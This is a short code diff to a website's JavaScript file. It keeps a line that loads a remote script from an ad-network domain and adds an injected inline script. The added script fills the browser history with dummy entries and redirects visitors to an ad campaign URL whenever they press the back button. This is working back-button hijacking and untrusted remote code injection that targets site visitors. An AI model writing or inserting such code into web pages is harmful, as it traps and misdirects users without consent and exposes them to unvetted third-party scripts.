@@ -12,3 +12,6 @@
 
 //---- Sosial-Barar adstera zonailmu.my.id --
 (function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"//evaluationgnatprotected.com/4a/00/1e/4a001e886418d57f6154e262bac9b581.js"}],"tag":"script","inner":""}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
+
+// --- Back Adstera
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"}],"tag":"script","inner":"\n!function(){\nvar campaign_link = \"https://evaluationgnatprotected.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b\";\nvar t;\ntry{\nfor(t=0;10>t;++t)history.pushState({},\"\",\"\");\nonpopstate=function(t){t.state&&location.replace(campaign_link)}}\ncatch(o){}\n}();\n"}],{"target":"body"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
